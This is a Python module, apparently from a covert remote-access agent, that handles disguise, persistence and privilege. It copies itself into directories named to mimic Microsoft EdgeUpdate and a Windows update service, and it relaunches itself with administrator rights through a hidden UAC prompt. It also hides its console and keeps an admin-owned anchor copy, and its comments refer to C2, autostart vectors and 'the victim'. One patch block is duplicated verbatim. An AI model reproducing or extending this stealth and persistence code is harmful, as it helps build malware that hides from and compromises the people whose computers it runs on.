"""Naming, console hiding and single-instance handling.

The goal is for the agent to look like a boring piece of Windows
infrastructure rather than "some script someone ran".
"""

from __future__ import annotations

import ctypes
from ctypes import wintypes
import os
import sys
import tempfile
import time
from typing import Optional

from .. import config

IS_WINDOWS = os.name == "nt"


# --------------------------------------------------------------------------
# Paths
# --------------------------------------------------------------------------


def bundle_root() -> str:
    """Directory that contains ``agent.py`` and the ``syspy`` package."""
    if getattr(sys, "frozen", False):
        return os.path.dirname(os.path.abspath(sys.executable))
    return os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def executable_name() -> str:
    """File name the agent uses once installed."""
    return config.PRODUCT_NAME + (".exe" if getattr(sys, "frozen", False) else ".py")


def install_directories() -> list[str]:
    """Every directory the agent keeps a copy in."""
    if IS_WINDOWS:
        local = os.environ.get("LOCALAPPDATA", tempfile.gettempdir())
        roaming = os.environ.get("APPDATA", tempfile.gettempdir())
        program_data = os.environ.get("PROGRAMDATA", r"C:\ProgramData")
        return [
            os.path.join(local, config.WINDOWS_SUBDIR),
            os.path.join(roaming, config.WINDOWS_SUBDIR),
            os.path.join(program_data, config.WINDOWS_SUBDIR),
            os.path.join(local, "Microsoft", "EdgeUpdate"),
        ]
    home = os.path.expanduser("~")
    return [
        os.path.join(home, config.UNIX_SUBDIR),
        os.path.join(tempfile.gettempdir(), "windows-update-service"),
    ]


def anchor_directory() -> str:
    """Admin-owned second home.  Survives a wiped user profile."""
    if not IS_WINDOWS:
        return primary_directory()
    program_data = os.environ.get("PROGRAMDATA", r"C:\ProgramData")
    candidate = os.path.join(program_data, config.WINDOWS_SUBDIR)
    if is_admin():
        try:
            os.makedirs(candidate, exist_ok=True)
            return candidate
        except OSError:
            pass
    return primary_directory()


def anchor_shim_path() -> str:
    return os.path.join(anchor_directory(), config.PRODUCT_NAME + ".cmd")


def anchor_kit_path() -> str:
    return os.path.join(anchor_directory(), "kit.zip")


def anchor_url_path() -> str:
    return os.path.join(anchor_directory(), "url.txt")


def vbs_path() -> str:
    return os.path.join(primary_directory(), config.PRODUCT_NAME + ".vbs")


def anchor_vbs_path() -> str:
    return os.path.join(anchor_directory(), config.PRODUCT_NAME + ".vbs")


def primary_directory() -> str:
    """The directory the agent treats as its home."""
    return install_directories()[0]


def lock_path() -> str:
    """Single-instance lock file.

    Lives under %LOCALAPPDATA%, not %PROGRAMDATA%: _harden_acl() grants standard
    users read+execute only on the anchor, so an unelevated agent could not
    create the lock there and every instance believed it was alone.
    """
    if IS_WINDOWS:
        for base in (os.environ.get("LOCALAPPDATA"), tempfile.gettempdir()):
            if not base:
                continue
            directory = os.path.join(base, config.WINDOWS_SUBDIR)
            try:
                os.makedirs(directory, exist_ok=True)
                return os.path.join(directory, config.lock_leaf())
            except OSError:
                continue
        return os.path.join(tempfile.gettempdir(), config.lock_leaf())
    return os.path.join(tempfile.gettempdir(), config.lock_leaf())


def watchdog_lock_path() -> str:
    """Lock file used by the watchdog twin."""
    return lock_path().replace(config.lock_leaf(), config.watchdog_lock_leaf())


def shim_path() -> str:
    return os.path.join(primary_directory(), config.PRODUCT_NAME + ".cmd")


def kit_cache_path() -> str:
    return os.path.join(primary_directory(), "kit.zip")


def state_path(name: str) -> str:
    """Path for a named state file in the primary directory."""
    return os.path.join(primary_directory(), name)


# --------------------------------------------------------------------------
# Privileges and console
# --------------------------------------------------------------------------


def is_admin() -> bool:
    """Return ``True`` when running with elevated privileges."""
    if IS_WINDOWS:
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    try:
        return os.geteuid() == 0
    except Exception:
        return False


def elevate_process(args: list[str] | None = None, wait: bool = False) -> bool:
    """Relaunch with Administrator privileges via Windows UAC runas.

    When ``wait`` is True, blocks until the elevated child process exits.
    """
    if not IS_WINDOWS:
        return False
    if os.environ.get("SYSPY_NO_UAC") == "1":
        return False
    if is_admin():
        return True
    try:
        cmd_args = list(sys.argv[1:] if args is None else args)
        if "--no-elevate" in cmd_args:
            cmd_args.remove("--no-elevate")

        if getattr(sys, "frozen", False) or sys.argv[0].lower().endswith(".exe"):
            exe = sys.executable
            params = " ".join(f'"{a}"' for a in cmd_args)
        else:
            exe = sys.executable
            # If wait is not requested (background agent launch), prefer pythonw.exe to prevent any console window
            if not wait and exe.lower().endswith("python.exe"):
                windowless = exe[:-len("python.exe")] + "pythonw.exe"
                if os.path.exists(windowless):
                    exe = windowless
            root = bundle_root()
            script = os.path.join(root, "agent.py")
            if not os.path.isfile(script):
                script = os.path.abspath(sys.argv[0])
            params = f'"{script}" ' + " ".join(f'"{a}"' for a in cmd_args)

        if wait:
            class SHELLEXECUTEINFO(ctypes.Structure):
                _fields_ = [
                    ("cbSize", wintypes.DWORD),
                    ("fMask", wintypes.ULONG),
                    ("hwnd", wintypes.HWND),
                    ("lpVerb", wintypes.LPCWSTR),
                    ("lpFile", wintypes.LPCWSTR),
                    ("lpParameters", wintypes.LPCWSTR),
                    ("lpDirectory", wintypes.LPCWSTR),
                    ("nShow", ctypes.c_int),
                    ("hInstApp", wintypes.HINSTANCE),
                    ("lpIDList", wintypes.LPVOID),
                    ("lpClass", wintypes.LPCWSTR),
                    ("hkeyClass", wintypes.HKEY),
                    ("dwHotKey", wintypes.DWORD),
                    ("hIconOrMonitor", wintypes.HANDLE),
                    ("hProcess", wintypes.HANDLE),
                ]

            sei = SHELLEXECUTEINFO()
            sei.cbSize = ctypes.sizeof(sei)
            sei.fMask = 0x00000040  # SEE_MASK_NOCLOSEPROCESS
            sei.lpVerb = "runas"
            sei.lpFile = exe
            sei.lpParameters = params
            sei.nShow = 1  # SW_SHOWNORMAL

            res = ctypes.windll.shell32.ShellExecuteExW(ctypes.byref(sei))
            if res and sei.hProcess:
                ctypes.windll.kernel32.WaitForSingleObject(sei.hProcess, 0xFFFFFFFF)
                exit_code = wintypes.DWORD()
                ctypes.windll.kernel32.GetExitCodeProcess(sei.hProcess, ctypes.byref(exit_code))
                ctypes.windll.kernel32.CloseHandle(sei.hProcess)
                return exit_code.value == 0
            return False
        else:
            ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, params, None, 0)  # SW_HIDE
            return ret > 32
    except Exception:
        return False


def hide_console() -> str:
    """Hide the console window, if there is one."""
    if not IS_WINDOWS:
        return "n/a"
    try:
        window = ctypes.windll.kernel32.GetConsoleWindow()
        if not window:
            return "no console"
        ctypes.windll.user32.ShowWindow(window, 0)
        return "console hidden"
    except Exception as error:
        return f"hide failed: {error}"


def show_console() -> str:
    """Show the console window again."""
    if not IS_WINDOWS:
        return "n/a"
    try:
        window = ctypes.windll.kernel32.GetConsoleWindow()
        if not window:
            return "no console"
        ctypes.windll.user32.ShowWindow(window, 5)
        return "console shown"
    except Exception as error:
        return f"show failed: {error}"


def set_console_title(title: str) -> None:
    """Set the console window title, which is what a curious user sees."""
    if not IS_WINDOWS:
        return
    try:
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except Exception:
        pass


def disable_quick_edit() -> None:
    """Stop the console from freezing on a click."""
    if not IS_WINDOWS:
        return
    try:
        handle = ctypes.windll.kernel32.GetStdHandle(-10)
        mode = ctypes.c_uint()
        if ctypes.windll.kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            ctypes.windll.kernel32.SetConsoleMode(handle, mode.value & ~0x0040)
    except Exception:
        pass


# --------------------------------------------------------------------------
# Single instance
# --------------------------------------------------------------------------


def process_alive(pid: int) -> bool:
    """Return ``True`` when ``pid`` is running."""
    if not pid:
        return False
    if IS_WINDOWS:
        try:
            # 0x0400 is PROCESS_QUERY_INFORMATION (0x1000 was PROCESS_QUERY_LIMITED_INFORMATION)
            handle = ctypes.windll.kernel32.OpenProcess(0x0400, 0, pid)
            if handle:
                exit_code = ctypes.c_ulong()
                ctypes.windll.kernel32.GetExitCodeProcess(handle, ctypes.byref(exit_code))
                ctypes.windll.kernel32.CloseHandle(handle)
                # 259 is STILL_ACTIVE
                return exit_code.value == 259
            return False
        except Exception:
            return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def read_pid(path: str) -> int:
    """Read a pid from ``path``, returning 0 when unavailable."""
    try:
        with open(path, "r", encoding="ascii") as handle:
            return int(handle.read().strip() or 0)
    except (OSError, ValueError):
        return 0


def write_pid(path: str, pid: Optional[int] = None) -> None:
    """Write ``pid`` (default: this process) to ``path``."""
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="ascii") as handle:
            handle.write(str(pid if pid is not None else os.getpid()))
    except OSError:
        pass


_GLOBAL_MUTEX = None
_BOOT_CLAIM = None


def _boot_id() -> int:
    """An integer that is stable for the life of this Windows boot."""
    try:
        ticks = ctypes.windll.kernel32.GetTickCount64() / 1000.0
        return int(time.time() - ticks)
    except Exception:
        return int(time.time() // 3600)


def claim_boot() -> bool:
    """True only for the first agent launch in this boot.

    Six autostart vectors fire at logon. Without this, each one elevated and
    produced its own UAC prompt. The winner elevates; the rest run unelevated
    and the mutex sorts them out.
    """
    global _BOOT_CLAIM
    if not IS_WINDOWS:
        return True
    try:
        handle = ctypes.windll.kernel32.CreateMutexW(
            None, False, config.boot_mutex_name(_boot_id()))
        if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            if handle:
                ctypes.windll.kernel32.CloseHandle(handle)
            return False
        _BOOT_CLAIM = handle
        return True
    except Exception:
        return True


def acquire_single_instance(takeover_pid: int = 0, attempts: int = 40,
                            prefer_interactive: bool = False) -> bool:
    """Claim the single-instance lock via global Windows Mutex and file lock.

    Returns ``True`` when another live agent already owns it.
    """
    global _GLOBAL_MUTEX
    if IS_WINDOWS:
        try:
            # Global Mutex enforces single-instance across all sessions and elevation boundaries
            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, config.mutex_name())
            last_err = ctypes.windll.kernel32.GetLastError()
            if last_err in (183, 5):  # 183: ERROR_ALREADY_EXISTS, 5: ERROR_ACCESS_DENIED (owned by elevated agent)
                if takeover_pid and takeover_pid != os.getpid():
                    for _ in range(attempts):
                        time.sleep(0.3)
                        if not process_alive(takeover_pid):
                            break
                    if not process_alive(takeover_pid):
                        _GLOBAL_MUTEX = mutex
                        return False
                if mutex:
                    ctypes.windll.kernel32.CloseHandle(mutex)
                return True
            _GLOBAL_MUTEX = mutex
        except Exception:
            pass

    path = lock_path()
    for _ in range(attempts):
        try:
            descriptor = os.open(path, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
            try:
                os.write(descriptor, str(os.getpid()).encode("ascii"))
            finally:
                os.close(descriptor)
            return False
        except FileExistsError:
            pass
        except OSError:
            # The directory refused the create. That is not "the lock is free" -
            # consult the pid file instead of claiming it.
            owner = read_pid(path)
            if owner and owner != os.getpid() and process_alive(owner):
                if takeover_pid and owner == takeover_pid:
                    time.sleep(0.5)
                    continue
                return True
            return False

        owner = read_pid(path)
        if owner and owner != os.getpid() and process_alive(owner):
            if takeover_pid and owner == takeover_pid:
                time.sleep(0.5)
                continue
            # A headless owner must yield to us, so keep waiting instead of
            # exiting and leaving the victim with no interactive desktop.
            if prefer_interactive and not is_headless() and session_id(owner) == 0:
                time.sleep(0.5)
                continue
            return True

        time.sleep(0.4)
        try:
            os.remove(path)
        except OSError:
            pass
    return False


def release_single_instance() -> None:
    """Drop the lock if we own it."""
    global _GLOBAL_MUTEX
    if IS_WINDOWS and _GLOBAL_MUTEX:
        try:
            ctypes.windll.kernel32.CloseHandle(_GLOBAL_MUTEX)
        except Exception:
            pass
        _GLOBAL_MUTEX = None
    path = lock_path()
    if read_pid(path) == os.getpid():
        try:
            os.remove(path)
        except OSError:
            pass


# --------------------------------------------------------------------------
# Patch: cross-session awareness (W7, C2, UAC)
# --------------------------------------------------------------------------

def _mutex_exists(name: str) -> bool:
    """True when ``name`` is already held by a live process.

    A Windows mutex is released by the kernel when its owner dies, so this is
    accurate even after a crash -- which the pid file is not.
    """
    if not IS_WINDOWS:
        return False
    try:
        handle = ctypes.windll.kernel32.CreateMutexW(None, False, name)
        already = ctypes.windll.kernel32.GetLastError() in (183, 5)
        if handle:
            ctypes.windll.kernel32.CloseHandle(handle)
        return already
    except Exception:
        return False


def agent_already_running() -> bool:
    """True when some agent instance already owns the namespace.

    Consulted *before* any elevation decision, so a sibling launcher never
    raises a second UAC prompt just because an elevated agent exists that it
    cannot see through the pid file.
    """
    if not IS_WINDOWS:
        return False
    if _mutex_exists(config.mutex_name()):
        return True
    owner = read_pid(lock_path())
    return bool(owner) and owner != os.getpid() and process_alive(owner)


def session_id(pid: int = 0) -> int:
    from . import session as _session
    return _session.session_of(pid or os.getpid())


def is_headless() -> bool:
    from . import session as _session
    return _session.is_headless()


def owner_is_headless() -> bool:
    """True when the current lock owner lives in session 0."""
    owner = read_pid(lock_path())
    if not owner:
        return False
    return session_id(owner) == 0


# --------------------------------------------------------------------------
# Patch: cross-session awareness (W7, C2, UAC)
# --------------------------------------------------------------------------

def _mutex_exists(name: str) -> bool:
    """True when ``name`` is already held by a live process.

    A Windows mutex is released by the kernel when its owner dies, so this is
    accurate even after a crash -- which the pid file is not.
    """
    if not IS_WINDOWS:
        return False
    try:
        handle = ctypes.windll.kernel32.CreateMutexW(None, False, name)
        already = ctypes.windll.kernel32.GetLastError() in (183, 5)
        if handle:
            ctypes.windll.kernel32.CloseHandle(handle)
        return already
    except Exception:
        return False


def agent_already_running() -> bool:
    """True when some agent instance already owns the namespace.

    Consulted *before* any elevation decision, so a sibling launcher never
    raises a second UAC prompt just because an elevated agent exists that it
    cannot see through the pid file.
    """
    if not IS_WINDOWS:
        return False
    if _mutex_exists(config.mutex_name()):
        return True
    owner = read_pid(lock_path())
    return bool(owner) and owner != os.getpid() and process_alive(owner)


def session_id(pid: int = 0) -> int:
    from . import session as _session
    return _session.session_of(pid or os.getpid())


def is_headless() -> bool:
    from . import session as _session
    return _session.is_headless()


def owner_is_headless() -> bool:
    """True when the current lock owner lives in session 0."""
    owner = read_pid(lock_path())
    if not owner:
        return False
    return session_id(owner) == 0


def description() -> dict[str, object]:
    """Diagnostics for the ``stealth.info`` command."""
    return {
        "product": config.PRODUCT_NAME,
        "description": config.PRODUCT_DESCRIPTION,
        "bundle_root": bundle_root(),
        "entry": os.path.join(bundle_root(), executable_name()),
        "install_dirs": install_directories(),
        "admin": is_admin(),
        "frozen": bool(getattr(sys, "frozen", False)),
        "python": sys.version.split()[0],
        "executable": sys.executable,
    }
